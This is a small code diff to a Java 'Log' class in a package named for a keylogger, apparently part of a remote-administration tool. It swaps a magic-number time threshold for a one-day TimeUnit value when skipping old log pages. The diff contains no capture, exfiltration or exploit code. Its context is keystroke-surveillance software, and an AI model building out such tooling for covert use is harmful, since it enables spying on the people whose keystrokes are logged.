@@ -20,6 +20,7 @@ package com.subterranean_security.crimson.sv.keylogger;
 import java.io.Serializable;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.concurrent.TimeUnit;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -61,7 +62,7 @@ public class Log implements Serializable {
 
 		for (Date d : pages.keyset()) {
 			// skip old dates
-			if (d.getTime() + 100000 < target.getTime()) {// TODO magic number
+			if (d.getTime() + TimeUnit.DAYS.toMillis(1) < target.getTime()) {
 				continue;
 			}
 			try {
